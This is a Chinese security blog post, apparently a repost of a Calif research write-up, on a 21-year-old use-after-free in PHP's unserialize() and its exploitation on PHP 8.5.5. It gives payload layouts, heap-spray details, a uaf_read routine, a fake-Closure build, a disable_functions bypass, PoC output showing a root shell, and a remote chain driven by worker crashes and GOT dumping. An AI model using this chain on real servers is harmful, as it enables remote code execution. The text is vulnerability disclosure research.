#  MAD Bugs：在 PHP 中寻找并利用一个尘封21年的漏洞  
 幻泉之洲   2026-05-18 04:17  
  
> 这篇文章记录了我们如何发现 PHP unserialize() 函数中一个潜伏了21年的 use-after-free 漏洞，并写出可在最新 PHP 8.5.5 上运行的本地及远程利用。整个过程从挖掘历史漏洞模式开始，到构建完整利用链结束，但背后更值得说的是，为什么这种漏洞到现在还能存在。  
  
  
这篇文章是 MAD Bugs 系列的一部分。在这个系列里，我们把前沿 AI 模型和人的经验组合在一起，专门挖漏洞，然后把挖到的东西公开。  
  
开始之前说件事。Stefan Esser 加入了 Calif。二十年前他可是 "PHP 安全圈的那个人"，我们觉得在他加入的时候，用一个新鲜的 unserialize UAF 漏洞来庆祝一下挺合适。  
  
PHP 的 unserialize() 函数这么多年来就是个漏洞制造机。这篇文章讲的是我们怎么在一个从 PHP 5.1 起就有问题的代码路径里，找到了一个新的 unserialize use-after-free。我们先写了个本地利用，能绕过 disable_functions，不需要 /proc 访问，也不依赖硬编码的偏移量，然后又把它变成了远程利用。远程利用只需要大概 2000 个 HTTP 请求，就能在最新发布的 PHP 8.5.5 上拿到 shell。据我所知，这是第一个公开的针对 PHP 8.x 的远程 UAF 利用。  
  
先打个预防针。远程利用链对目标有一个比较强的前提：目标应用必须加载了一个实现了 Serializable 接口的类，这个类在自己的 unserialize() 方法里对内部数据递归调用 unserialize()，并且会扩展内部对象的属性表。我们提供的 PoC 里带了这样一个类。现实中的代码符合这种模式的很少，所以这个远程 PoC 的适用范围有限。本地利用没有这些限制。  
  
漏洞本身出在 zend_user_unserialize() 函数里，少了 BG(serialize_lock)++ 这一行。这个代码路径从 2005 年 PHP 5.1 引入 Serializable 起就是有问题的，漏了两行代码，结果就挂了这么多年。我们还会把发现这个漏洞的审计技能开源出来：/php-unserialize-audit。  
  
不过先聊点历史。为什么这种事还在发生，这个故事比漏洞本身有意思。  
## Unserialize 血泪简史  
  
PHP 当了好多年黑客的游乐场。随便一本 Web 黑客教程前几章的技巧，要么是在 PHP 上发明的，要么是在 PHP 上练到极致的：用精心构造的 include 路径做 LFI，通过 allow_url_include 做 RFI，phar:// 元数据反序列化，等等。但破坏力最大的攻击，还是 PHP 引擎本身的 use-after-free 漏洞：只要 unserialize() 里有一个能用的 UAF，就等于有了一把万能武器，任何把用户输入传给这个函数的应用都得跪。这条线是从 Stefan Esser 开始的。  
  
他 2007 年的 Month of PHP Bugs 包含了 MOPB-04-2007，第一个公开的 unserialize UAF。到 POC 2009，他已经展示了 __destruct / __autoload 能让对象注入对真实应用产生实际危害。BlackHat 2010 上，他提出了 Property-Oriented Programming (POP) 链，同时还给出了第一个完整的引擎层面 unserialize UAF 利用。至此，两个不同层面的问题都摆上了台面：应用层的 POP 链，和反序列化器内部的引擎级内存破坏。  
### Taoguang Chen 和 UAF 淘金热（2015–2016）  
  
2015 年，Taoguang Chen（@chtg57）开始以一种让人怀疑他手里有一套方法论的速度持续提交 unserialize UAF：DateTime、__wakeup、SplObjectStorage、session 处理器、SplDoublyLinkedList、GMP，还有更多（CVE-2015-0273、-2787、-6834、-6835 等，一直延续到 2017 年）。  
  
每一个漏洞都遵循同一种模式。一个魔术方法或自定义的 unserialize 处理器会释放一个 zval，而这个 zval 还登记在 var_hash 里——var_hash 是反序列化器维护的一个表，记录到目前为止已解析的所有值。后面序列化流里的 R:N 反向引用会解析到这个已被释放的槽位上。攻击者用受控的数据把这块内存占回来，然后通过类型混淆拿到代码执行。他的 CVE-2015-0273 PoC 就完整利用了这种 UAF 类型，在 PHP 5.5.14 上一直打到 zend_eval_string()。  
### Check Point 和 PHP 7（2016）  
  
PHP 7 重写了 Zend 引擎和 zval 的内存布局，但这个 bug 类型也跟着过来了。2016 年，Check Point 的 Yannay Livneh 在新引擎里又搞出了三个（CVE-2016-7479/-7480，可 RCE）。Weisser、cutz 和 Habalov 则通过两个 GC 路径的 UAF 黑了 Pornhub。他们的结论很直接：  
> "永远不要对用户输入使用 unserialize。以为用最新版本的 PHP 就能保护这种场景下的 unserialize，这个想法很糟。"  
  
  
工具也在进化。Charles Fol 的 PHPGGC（2017）把 Esser 的 POP 链变成了一个即时可用的 gadget 目录，覆盖所有主流框架。Sam Thomas 2018 年的 phar:// 工作则把 file_exists()、fopen()、stat() 这类函数也变成了反序列化的攻击入口。  
  
二十年研究，几十个 CVE，规律清晰得不能再清晰。然后到 2017 年 8 月，PHP 项目组做了一个决定。  
## "不是安全问题"  
  
2017 年 8 月 2 日，PHP 内部邮件列表讨论 "Unserialize 安全策略"。结果出来了：PHP 不再把 unserialize() 的内存破坏漏洞当作安全漏洞来对待。  
  
理由是 unserialize() 本来就不是设计来接收不可信输入的，开发者应该用 json_decode() 替代。bug 还是会修，但没有 CVE，也没有紧迫性。Chen 在做了两年负责任的漏洞披露后看到这个，显然不太高兴。到今天，PHP 文档里还挂着这个警告：  
> "无论 allowed_classes 选项的值是什么，都不要把不可信的用户输入传给 unserialize()。"  
  
## 漏洞本身  
  
在这样的背景下，我们构建了一个新的审计技能 /php-unserialize-audit。方法很简单：给 Claude 投喂了大约 20 个历史上的 unserialize 安全公告（包括 Chen 2015 年的 SPL UAF），然后让它提炼出一套 bug 类型分类，等模型学会了就让它去找。然后我们把它对准了 PHP 8.5.5。有一个发现很显眼：Serializable 的重入会共享外层的 var_hash。  
  
要理解为什么，需要先交代三点背景。  
  
var_hash 是反序列化器用来解析反向引用的表。PHP 的序列化格式里有 R:N;（和 r:N;）标记，指向到目前位置解析过的第 N 个值。解析器给每个槽位维护一个 zval*。zval 是 16 字节的单元：8 字节的值，4 字节的 u1（类型标签和标志位），4 字节的 u2（按上下文复用）。标量类型（IS_LONG、IS_DOUBLE 等）的值直接内联在 value 字段里；引用计数类型（IS_STRING、IS_OBJECT、IS_REFERENCE 等）则把指向堆数据的指针放在那里。对于对象属性来说，zval 就住在属性 HashTable 的 arData 缓冲区里。  
  
属性 HashTable 把所有条目打包在一块连续的内存分配里。每个桶 32 字节：16 字节的 zval (val)，8 字节的缓存哈希值 (h)，8 字节的键字符串指针 (key)。桶按插入顺序排列在 arData 里；另外还有一个哈希索引区域，通过 hash & nTableMask 来路由查找。碰撞通过一个藏在 zval 的 u2 槽位里的 next 字段来串链。HT 初始大小 nTableSize=8，溢出时翻倍，这意味着要分配一个新的 arData，把桶拷过去，然后 efree 掉旧的。  
  
BG(serialize_lock) 负责让每个顶层 unserialize() 调用有自己私有的 var_hash。钩子点（__wakeup、__unserialize、__destruct）在用户代码执行前会把这个计数器加 1；嵌套调用看到锁不是零，就会分配自己私有的 var_hash。  
  
问题出在这儿：zend_user_unserialize()，这个函数是 Serializable::unserialize() 的分发点，它没加这个锁。也就是说，如果方法体里递归调用了 unserialize($data)，它会共享外层的 var_hash。内层解析出来的属性 zval 会被登记为外层的槽位，指针指向内层流的对象的 arData。如果用户代码随后修改那个对象，导致属性表扩容，zend_hash_do_resize 就会 efree 掉旧的 arData，而后面来的 R:N; 就会解引用到已被释放的内存。  
  
  
// Zend/zend_interfaces.c:442-460: 没有 serialize_lock 递增  
  
ZEND_API int zend_user_unserialize(zval *object, zend_class_entry *ce,  
  
                                   const unsigned char *buf, size_t buf_len,  
  
                                   zend_unserialize_data *data)  
  
{  
  
    zval zdata;  
  
    ZVAL_STRINGL(&zdata, (char*)buf, buf_len);  
  
    // BG(serialize_lock)++ 这里缺失了  
  
    zend_call_method_with_1_params(           // 用户 PHP 代码在这里执行  
  
        Z_OBJ_P(object), Z_OBJCE_P(object),  // 没有锁保护  
  
        NULL, "unserialize", NULL, &zdata);  
  
    zval_ptr_dtor(&zdata);  
  
    ...  
  
}  
  
  
其他所有在反序列化过程中分发到用户代码的地方（__wakeup、__unserialize、__destruct）都会递增这个锁。就这个函数没有，而且从 PHP 5.1 起就没有。本质上就是 Chen 的 pch-030 在现代 PHP 里活了下来：2015 年的补丁收紧了个别 SPL 调用点，但从没碰过 Serializable 的分发路径。  
## 触发 UAF  
  
能触发这个漏洞的最简 gadget 长这样：  
  
  
class CachedData implements Serializable {  
  
    public function serialize(): string { return ''; }  
  
    public function unserialize(string $data): void {  
  
        unserialize($data)->x = 0;  
  
    }  
  
}  
  
  
这是一个人造的 gadget。对本地利用来说这无所谓：攻击者在目标上跑 PHP 代码，控制类定义，把 gadget 和 payload 一起打进去就行。对远程利用来说，这就是前提条件。利用链对有相同结构的任何类都能跑，只是我们没在现实代码里找到这样的类。  
## 利用策略  
  
每一次对 unserialize() 的 payload 都是同一个结构：一个顶层数组，里面装着 gadget、32 个喷射字符串，以及一个或多个 R:N 反向引用。Gadget 释放 arData，一个喷射字符串占回来，R:N 解引用。不同步骤之间只改变喷射内容和 R:N 的选择。  
1. 泄露堆地址。ASLR 意味着脚本不知道任何东西在哪儿。用一种方式利用 UAF，让引擎通过已释放的槽位写一个新鲜的堆指针到我们能控制的喷射区里，然后把它读回来。这个泄露出来的堆地址就成了后续所有操作的锚点。  
  
1. 构建 uaf_read。复用同一个 gadget UAF，但用不同的喷射内容：伪造一个字符串，指向任意地址。解析器解析反向引用时，PHP 会把这个喷射区当作一个位于目标地址的真实字符串，脚本就能读 N 字节回来。配合堆锚点，这足够完成后续所需的所有内存探查。  
  
1. 构建一个伪造的 zend_object。真实的对象有一个类入口、一个处理器虚表，以及在正确偏移量上的函数指针。用 uaf_read 从堆锚点一路走过引擎元数据，直到这些值都已知，然后把它们复制到字节数组里，形状就像一个 zend_object。  
  
1. 在伪造对象上派发一个函数。PHP 会把那些伪造的字段当作真实对象来用，落到伪造的函数指针上，然后调用它。这就是 RCE。  
  
本地利用和远程利用都遵循这个框架。区别只在于用哪种伪造对象（Closure 还是 stdClass）、走哪条派发路径，以及第三步要走多远才能找到函数指针。下面的各个阶段会一步步说清楚。  
## 本地利用  
  
本地利用链在一个 PHP 进程里跑完所有四步，总共触发大约 30 次 UAF。进程内往返是微秒级的，所以请求数的概念只有在远程利用链里才有意义。  
### 第一步：泄露堆地址  
  
  
payload 长这样：  
  
  
a:41:{ // 槽位 1: 顶层数组  
  
  i:0;        C:10:"CachedData"::{ // 槽位 2  
  
                O:8:"stdClass":8:{ s:2:"p0";i:...; ... s:2:"p7";i:...; } // 槽位 3  
  
              }  
  
  i:1..i:32;  s:280:"";   // 槽位 4..槽位 32, 每个带 8 个 IS_LONG 标记  
  
  i:33..i:40; R:4..R:11;               // 槽位 33..槽位 40, 八个反向引用指向槽位 4..11  
  
}  
  
  
发生了什么，按顺序：  
  
1. 外层解析器启动。var_hash 的槽位 1 = 顶层数组。  
  
2. 解析 CachedData。槽位 2 = 新实例。分发到 zend_user_unserialize() → CachedData::unserialize($data)，没有递增 BG(serialize_lock)。  
  
3. Gadget 体运行 unserialize($data)。内层解析器看到锁是 0，共享外层 var_hash。槽位 3 = 内层 stdClass；槽位 4..11 = 它的 8 个属性 zval，每个都指向 stdClass 的 320 字节 arData 分配（64 字节哈希索引 + 8 × 32 字节桶，正好是 bin-320 槽位大小）。  
  
4. Gadget 体运行 ->x = 0。第 9 次插入进一个 nTableSize=8 的 HT。zend_hash_do_resize 分配一个新的 arData，nTableSize=16，把 8 个桶拷过去，然后 efree 掉原来的 320 字节。槽位 4..11 现在都是悬空的。  
  
5. Gadget 返回。外层解析器继续。它分配 32 个喷射字符串（280 字节内容 + 24 字节头部，落在 bin-320）。其中一个占回了已释放的 arData 槽位；它的 val[] 现在覆盖了原来 stdClass 的 arData。  
  
6. R:N 解析。解析器解引用槽位 N（现在指向喷射内容）并读到 IS_LONG 标记。ZVAL_MAKE_REF 分配一个新的 zend_reference，把标记拷进去，再写回 16 字节：(type=IS_REFERENCE, value=ptr_to_ref)。这 16 字节就落在了喷射区里。  
  
喷射区落在和旧 arData 相同的起始地址。它的 val[] 起始于分配地址 +0x18（24 字节的 zend_string 头部），而 arData 的桶起始于分配地址 +0x40（64 字节哈希索引），所以 bucket[k] 覆盖了喷射区偏移 0x28 + k * 0x20：  
  
  
IS_LONG 标记正好就在那些偏移上，所以每个都落在 var_hash 槽位 4..11 仍然指向的位置；R:4 解析到 bucket[0]（p0，第一个插入的属性）。  
  
  
spray (input, 280 bytes):                  spray[k] (output, after the UAF):  
  
  +0x28: 00 00 BB BB ...    ← bucket[0]     +0x28: 80 4D 6B E2 16 7D 00 00   ← heap ptr (ZVAL_MAKE_REF)  
  
  +0x30: 04 00 00 00        ← IS_LONG       +0x30: 0A 00 00 00               ← IS_REFERENCE  
  
  +0x48: 01 00 BB BB ...    ← bucket[1]     +0x48: A0 4D 6B E2 16 7D 00 00   ← heap ptr  
  
  +0x50: 04 00 00 00        ← IS_LONG       +0x50: 0A 00 00 00               ← IS_REFERENCE  
  
  ...                                       ...  
  
  
脚本遍历 $result[1..32]，找到标记被修改的那个喷射区，然后在第一个变化的偏移量上取 8 字节。这就是泄露出来的堆地址。堆块基址是 addr & ~0x1FFFFF。（用 8 个引用而不是 1 个是为了冗余；用 IS_LONG 标记是因为非引用计数的值能在解析器的析构遍历中存活下来。）  
### 第二步：构建 uaf_read  
  
uaf_read(addr, n) 读取任意地址的 N 字节。和第一步一样的 gadget UAF，同样的喷射回收，payload 只有两处变化：只用一个 R:4 而不是八个，而且喷射区在 bucket[0] 的位置携带了一个伪造的 IS_STRING zval：  
  
  
a:34:{  
  
  i:0;  C:10:"CachedData"::{ ...inner stdClass with 8 properties... }  
  
  i:1;  s:280:"";  
  
  ...  
  
  i:32; s:280:"";  
  
  i:33; R:4;  
  
}  
  
  
每个喷射区的 280 字节内容是二进制的，但有意义的偏移是这些：  
  
  
spray content (280 bytes):  
  
  +0x00..+0x27               (zeros, covers the 64-byte hash index region)  
  
  +0x28:   ← bucket[0].val: forged IS_STRING value  
  
  +0x30: 06 00 00 00 ...     ← bucket[0].type: IS_STRING  
  
  +0x48..+0xFF               (other buckets, IS_LONG markers, defensive)  
  
  
gadget 释放 arData，一个喷射区占回来，R:4 读到 bucket[0] 处伪造的 (IS_STRING, value=addr-0x18) zval，$result[33] 就变成了一个 PHP 引用，指向一个 val[] 起始于 addr 的字符串。这和第一步正好相反：第一步我们忽略 $result[33]，读喷射区的副作用写入；这次我们直接读 $result[33]，因为我们伪造了一个 PHP 能通过正常字符串操作暴露出来的形状。  
  
  
private function uaf_read($addr, $n = 8) {  
  
    foreach ([0, 0x08, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200] as $bias) {  
  
        $target = $addr - 0x18 - $bias;  
  
        $spray  = $this->build_spray_isstring($target);  
  
        $result = @unserialize($this->build_payload($spray, 1));  
  
        $str    = $result[self::SPRAY_COUNT + 1];  
  
        if (is_string($str) && strlen($str) > $bias + $n - 1) {  
  
            return substr($str, $bias, $n);  
  
        }  
  
    }  
  
    return false;  
  
}  
  
  
bias 循环是当 addr - 0x18 碰巧落在一个未映射的页上时，把伪造字符串的基址逐步往后退。uaf_read 加上第一步的堆锚点，后续所有内存探查就都够了。  
### 第三步：构建伪造的 Closure  
  
第四步需要引擎派发到一个我们选定的 C 函数（这里用的是 zif_system，PHP 原生的 system() 实现）。为了让 PHP 通过一条暴露给用户代码的路径来做到这一点，本地利用把伪造的 zend_object 具体做成了一个 Closure。  
  
Closure 是 PHP 对 function() { ... } 的运行时表示：一个 zend_object 后面跟着一个 zend_function，后者的 func.handler 持有 C 函数指针。在 PHP 调用一个值的所有方式中，只有 $obj(...) 纯粹从运行时字段派发，而 Closure 是字段最少的那种：ZEND_INIT_DYNAMIC_CALL 检查 obj->ce == zend_ce_closure，如果成立，就直接读 func.handler。所以第四步的触发是 $result[33]("id && uname -a")，这一步的任务则是填好一个缓冲区，让里面的字节能冒充一个真实的 Closure：ce = zend_ce_closure，handlers = closure_handlers，func.handler = zif_system。  
  
  
通过 "巨型字符串" 找到 ce 和 handlers。  
  
喷射 256 个 Closure 对象（$GLOBALS["_spray_$i"] = function(){}; × 256），然后调用 uaf_read(chunk - 0x10, ...)。ZendMM 在 chunk + 0x00 处的 chunk 头部是一个堆结构指针（换算成整数大约 140 TB），这个值变成了伪造 zend_string 的 len 字段；然后 val[] 就一次性覆盖了整个 2 MB 的堆块。扫描堆块找 zend_object 的 GC 模式，按 handlers 地址分组，最大的簇（256+ 个 Closure）就暴露了 closure_handlers（一个 .bss 地址）和 zend_ce_closure（一个 brk 堆地址）。  
  
  
走到 EG。closure_handlers 在 .bss 段里离 executor_globals (EG) 很近，因为两者都是同一个编译单元里的静态全局变量。从 closure_handlers 出发，以 8 字节为步长向前走，对每个 offset uaf_read 三个连续的 8 字节指针，寻找 (function_table, class_table, zend_constants) 三元组。三元组的 offset 是 EG+0x1b0（8.0–8.4）或 EG+0x1c8（8.5+）；两个都试试。找到后，EG = closure_handlers + delta，symbol_table = EG + 0x130。  
  
走到 zif_system，绕过 disable_functions。zend_disable_function() 只打补丁到运行时的 function_table 副本；源头的 zend_function_entry[] 数组在标准模块的 .data.rel.ro 段里是没动过的。所以先在 function_table 里查 var_dump（没被禁用，同模块），顺着它的 module 指针走到 zend_module_entry，然后线性扫描静态的 zend_function_entry[] 找 "system"。  
  
伪造字节并定位。在 $GLOBALS["_xfc"] 里分配一个普通的 PHP 字符串，在 OFF_OBJ_CE / OFF_OBJ_HANDLERS / OFF_CLOSURE_FUNC + OFF_HANDLER 这三处把值写进去，然后 uaf_read EG.symbol_table 对 "_xfc" 做一次 DJBX33A 哈希查找，拿到它的 zend_string*。这个指针加 24（val[] 的偏移）就是伪造 Closure 的地址。  
### 第四步：派发  
  
最后复用一次 gadget UAF，在槽位 4 的桶里放一个伪造的 (IS_OBJECT, value = fake_closure_addr) zval，并且设置 IS_TYPE_REFCOUNTED | IS_TYPE_COLLECTABLE 标志，这样引擎就会把这个值当作真实的引用计数对象指针来处理。$result[33] 现在被 PHP 认为是一个 Closure。调用它就完成派发：  
  
  
$result[33]("id && uname -a")  
  
  -> ZEND_INIT_DYNAMIC_CALL: obj->ce == zend_ce_closure?  YES  
  
  -> ZEND_DO_FCALL:          handler = obj->func.handler   ← zif_system  
  
  -> zif_system("id && uname -a")                          → shell  
  
  
引擎从头到尾都不知道自己在看伪造的字节。每个字段的每个偏移都匹配真实的 Closure 布局；唯一的区别是来源。  
### PoC  
  
完整 ASLR 下，PHP 8.5.5，10/10 次成功。  
  
  
$ ./run_poc.sh  
  
[*] Image:    php:8.5-cli  
  
[*] Disabled: system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec  
  
  
=== PHP Serializable var_hash UAF → RCE ===  
  
    Arch: aarch64    ADDR_MAX=0xffffffffffff    DELTA_MAX=0x600  
  
  
[*] Phase 1: Heap address leak via R: write-through...  
  
[+] zend_reference @ 0xffffa80b5b80  
  
  
[*] Phase 3: Finding object pointers (ce, handlers) in heap...  
  
[+] Found 3 object groups, best: count=257 ce=0xaaab16600360 handlers=0xaaaae0950e50  
  
  
[*] Phase 4: Locating executor globals...  
  
[+] function_table @ 0xaaab165c0160 (nNumUsed=1206, delta=0xd8, ft_off=+0x1c8)  
  
[+] EG @ 0xaaaae0950f28 (ft_off=+0x1c8), symbol_table @ 0xaaaae0951058 (nNumUsed=264)  
  
  
[*] Phase 5: Bypassing disable_functions...  
  
[!] system() is in disable_functions: system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec  
  
[*] Bypassing: resolving zif_system from module function entry table...  
  
[+] standard module @ 0xaaaae0931ca8 (via var_dump)  
  
[+] module functions @ 0xaaaae0865298  
  
[+] zif_system (from module) @ 0xaaaadf6fb7b0  
  
  
[*] Phase 6: Building the fake closure...  
  
  
[*] Phase 7: Locating the fake closure via EG.symbol_table...  
  
[+] Fake closure @ 0xffffa8082798  
  
  
[*] Phase 8: Type confusion and RCE...  
  
[+] Got fake Closure!  
  
  
──────────────────────────────────────────────────  
  
uid=0(root) gid=0(root) groups=0(root)  
  
Linux 51012e0a33e0 6.10.14-linuxkit #1 SMP Wed Sep 10 06:47:45 UTC 2025 aarch64 GNU/Linux  
  
  
──────────────────────────────────────────────────  
  
  
[+] Exploit complete.  
  
## 远程利用  
  
本地利用是以 PHP 代码的方式在目标上运行的。远程利用只用 HTTP POST 请求，打的是一个把攻击者控制的数据传给 unserialize() 的应用。  
  
目标环境：Docker php:8.5-apache，基于 Debian，Apache mod_php prefork MPM，jemalloc 支持的 ZendMM。漏洞端点就是前面那个单行 gadget，外加一行把序列化结果原样输出：  
  
  
class CachedData implements Serializable {  
  
    public function serialize(): string { return ''; }  
  
    public function unserialize(string $data): void {  
  
        unserialize($data)->x = 0;  
  
    }  
  
}  
  
  
echo serialize(@unserialize($_REQUEST['cook']));  
  
### 转到远程后变了什么  
  
unserialize() 之后没有 PHP 代码再执行。端点最后只做 echo serialize($result)，本地利用里 $result[33](...) 的 Closure 派发行不通了。伪造的对象必须由 serialize() 自己来触达。  
  
Worker 崩溃就是侧信道。Apache prefork 给每个请求分配独立进程。访问一个坏地址会导致那个 worker 崩溃；Apache 会 spawn 一个替代。崩溃很廉价，因为所有 worker 都是从一个父进程 fork 出来的，那之后 ASLR 就已经固定了，所以 libphp、libc 和 EG 在每个 worker 里都在同样的位置。只有每个 worker 临时的堆状态是独立的，利用根据需要重新泄露就行。  
  
没有符号知识。每个地址都在运行时从 ELF 头部、PT_DYNAMIC、.gnu_hash 和 GOT 推导出来。  
### 第一步和第二步：堆泄露和 uaf_read  
  
和本地链完全相同。第一步从响应体的被污染喷射区里读出 ZVAL_MAKE_REF 写入的指针（1 个请求）。第二步在 val 偏移 0x28 处伪造一个 IS_STRING zval，然后从序列化的响应里读出 $result[33]。唯一区别是每次 uaf_read 现在都是一次 HTTP 往返，所以后面的请求数基本上就是在数 uaf_read 调用次数。  
### 第三步：构建伪造的 zend_object  
  
伪造对象是一个 stdClass，不是 Closure（原因见第四步）。伪造它需要三个运行时地址（stdClass 的类入口、喷射字符串自身的地址，拿来当伪造虚表，以及 libc system()）加一个硬编码常量（get_properties_for 在 zend_object_handlers 里的偏移，即 0xC8）。没有本地利用那个 closure 簇锚点，这些地址每一个都得从原始二进制元数据里找。远程链的大部分时间都花在走这些元数据上。脚本里有五个子步骤（R-2 到 R-6）。  
  
  
**3a: 找到 libphp.so (R-2)**  
  
本地 Closure 簇的招在这里不管用（unserialize() 拒绝构造 Closure），所以链需要 libphp 的镜像基址。在堆泄露点周围以 2 MB 然后 1 MB 步长扫描 \x7fELF；每次探测就是一次 uaf_read，坏地址让一个 worker 崩溃，好地址返回字节。崩溃的探测消耗一个请求，下一个候选地址会由一个新的、拥有相同内存布局的 worker 来处理。大约 50–120 个请求。  
  
**3b: 通过 .gnu_hash 解析符号 (R-3)**  
  
拿到 libphp 的 ELF 基址后，做 ld.so 做的事：读 ELF 头部，找到 PT_DYNAMIC，遍历 .dynamic 找 .dynsym / .dynstr / .gnu_hash / .got.plt 的地址，然后执行标准的 .gnu_hash 查找（哈希函数名，检查 bloom filter，遍历链，读 Elf64_Sym.value）。出来两个值：executor_globals（3d 需要的 .bss 地址）和 PLTGOT。GOT 里 ld.so 已经写好了所有 libphp 曾经调用过的、已解析的 libc 地址，3c 会把它 dump 出来。约 10 个请求。  
  
**3c: 通过 GOT dump 找 libc system() (R-4)**  
  
这是占大头的一步。第四步的虚表需要一个 libc system 指针；libc 相对 libphp 的偏移在不同主机上不固定，但 libphp 的 GOT 里已经有了已解析的 libc 指针。dump 它，按距离聚类，最大的非 libphp 簇就是 libc。  
  
dump ~83 KB，按一次 uaf_read 一次读的话会烧掉几千次小读，所以链复用了伪造 len 的 trick。.dynamic 的 DT_PLTRELSZ 条目有一个 d_val 约 82,872（PLT 重定位表大小），这个值恰好能覆盖 .dynamic 的剩余部分和 .got.plt。把伪造 zend_string 的基址设在 &d_val - 0x10，这个 8 字节字段就成了 len；val[] 则覆盖整个 GOT。  
  
  
响应路径仍然把结果序列化后分块返回，所以 83 KB 大约消耗 1,500–2,000 个请求。一旦 GOT 字节到手，按页聚类指针，取最大的非 libphp 组作为 libc，然后在里面用 3b 的 .gnu_hash 查找 system。  
  
**3d: 找到 stdClass 类入口 (R-5)**  
  
  
伪造对象的 ce 必须等于 zend_standard_class_def。从 3b 的 executor_globals 读 EG.class_table，对 "stdclass" 做 DJBX33A 哈希查找，跟 bucket。约 55  ### 参考资料  
  
[1]   
https://blog.calif.io/p/mad-bugs-finding-and-exploiting-a  
  
